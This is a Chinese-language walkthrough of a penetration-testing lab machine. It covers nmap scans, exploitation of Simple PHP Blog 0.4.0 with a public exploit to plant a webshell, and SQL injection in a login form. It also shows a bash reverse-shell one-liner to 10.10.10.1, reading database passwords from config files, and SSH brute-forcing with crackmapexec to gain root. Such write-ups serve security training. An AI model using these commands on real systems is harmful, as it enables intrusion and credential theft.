添加网卡，修改IP

![image-20241112170938395](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112170938395.png)

## port scan

TCP Scan

```shell
# Nmap 7.94SVN scan initiated Mon Nov 11 08:45:16 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.0025s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Mon Nov 11 08:45:43 2024 -- 1 IP address (1 host up) scanned in 26.49 seconds
```

```shell
# Nmap 7.94SVN scan initiated Mon Nov 11 08:48:25 2024 as: nmap -sT -sV -sC -O -p22,80 -oN nmap_results/detils_scan 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.0012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.17 (Ubuntu)
|_http-title: Welcome to this Site!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose
Running: Actiontec embedded, Linux 2.4.X
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37
OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UDP Scan

```shell
# Nmap 7.94SVN scan initiated Mon Nov 11 08:47:32 2024 as: nmap -sU --min-rate 10000 -p- -oN nmap_results/udp_scan 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.00047s latency).
All 65535 scanned ports on 10.10.10.100 are in ignored states.
Not shown: 65535 open|filtered udp ports (no-response)
```

vuln scan

```shell
# Nmap 7.94SVN scan initiated Mon Nov 11 08:49:16 2024 as: nmap --script=vuln -p22,80 -oN nmap_results/script_scan 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.00050s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.100
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.100:80/register.php
|     Form id: 
|     Form action: register.php
|     
|     Path: http://10.10.10.100:80/login.php
|     Form id: 
|_    Form action: login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       httponly flag not set
|   /login.php: 
|     PHPSESSID: 
|       httponly flag not set
|   /login/: 
|     PHPSESSID: 
|       httponly flag not set
|   /index/: 
|     PHPSESSID: 
|       httponly flag not set
|   /register/: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /blog/: Blog
|   /login.php: Possible admin folder
|   /login/: Login page
|   /info.php: Possible information file
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.2.17 (ubuntu)'
|   /index/: Potentially interesting folder
|   /info/: Potentially interesting folder
|_  /register/: Potentially interesting folder
```

SSH没什么漏洞

## web

主页是一个站，`/blog`是一个站

首先指纹识别

![image-20241112171736796](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112171736796.png)

blog站点是`Simple PHP Blog 0.4.0`，仔细看源码也可以看到

![image-20241112171853065](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112171853065.png)

找一下历史漏洞

```shell
searchsploit Simple PHP Blog 0.4.0
```

![image-20241112172014427](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172014427.png)

使用`1191.pl`尝试

![image-20241112172243980](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172243980.png)

```shell
./1191.pl -h http://10.10.10.100/blog -e 2
```

```shell
./1191.pl -h http://10.10.10.100/blog -e 1
```

上传`webshell`，或者使用3选项，生成登录账号密码，后台有个文件上传漏洞

![image-20241112172440194](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172440194.png)

> http://10.10.10.100/blog/images/cmd.php?cmd=id

成功执行命令

如果报错，尝试安装依赖

```
apt install libswitch-perl
```

关于兔子洞

```http
POST /login.php HTTP/1.1
Host: 10.10.10.100
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Origin: http://10.10.10.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Referer: http://10.10.10.100/login.php
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Cookie: PHPSESSID=ba88e12vnq70i44k3qcjr675n5
Content-Length: 60

email=adminqq%40qq.com&pass=1111&submit=Login&submitted=TRUE
```

`email`处存在sql注入

![image-20241112172822344](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172822344.png)

拿到密码：`admin@isints.com:killerbeesareflying`，登录后台

![image-20241112172951088](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172951088.png)

## reverse shell

```shell
bash -c 'bash -i >& /dev/tcp/10.10.10.1/1234 0>&1
```

## SSH

尝试提权

`sudo`，`suid`，定时任务没有

`passwd`文件

```shell
root:x:0:0:root:/root:/bin/bash
dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
```

这两用户可以利用

查看端口开放情况

```shell
www-data@web:/var/www/blog/images$ netstat -lntp
netstat -lntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

3306端口开放，可以找数据库账号密码

```bash
www-data@web:/var/www$ cat mysqli_connect.php
cat mysqli_connect.php
<?php # Script 8.2 - mysqli_connect.php

DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'goodday');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');

www-data@web:/var$ cat mysqli_connect.php
cat mysqli_connect.php
<?php # Script 8.2 - mysqli_connect.php

DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'root@ISIntS');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');
```

user list

> root
>
> dan

pass list

> goodday
>
> root@ISIntS
>
> killerbeesareflying

```shell
www-data@web:/var/www/blog$ mysql -uroot -proot@ISIntS
mysql -uroot -proot@ISIntS
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 216
Server version: 5.1.54-1ubuntu4 (Ubuntu)

Copyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.
This software comes with ABSOLUTELY NO WARRANTY. This is free software,
and you are welcome to modify and redistribute it under the GPL v2 license

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

然后，利用`crackmapexec`工具爆破SSH

```shell
crackmapexec ssh 10.10.10.100 -u user.list -p pass.list
```

```shell
SSH         10.10.10.100    22     10.10.10.100     [*] SSH-2.0-OpenSSH_5.8p1 Debian-1ubuntu3
SSH         10.10.10.100    22     10.10.10.100     [-] root:goodday Authentication failed.
SSH         10.10.10.100    22     10.10.10.100     [+] root:root@ISIntS (Pwn3d!)
```

`root:root@ISIntS`成功

```
ssh root@10.10.10.100
```

```bash
root@web:~# id
uid=0(root) gid=0(root) groups=0(root)
root@web:~# whoami
root
root@web:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:39:86:a2  
          inet addr:10.10.10.100  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe39:86a2/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3266 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2815 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:545528 (545.5 KB)  TX bytes:610881 (610.8 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:58 errors:0 dropped:0 overruns:0 frame:0
          TX packets:58 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:5312 (5.3 KB)  TX bytes:5312 (5.3 KB)

root@web:~# uname -a
Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
```









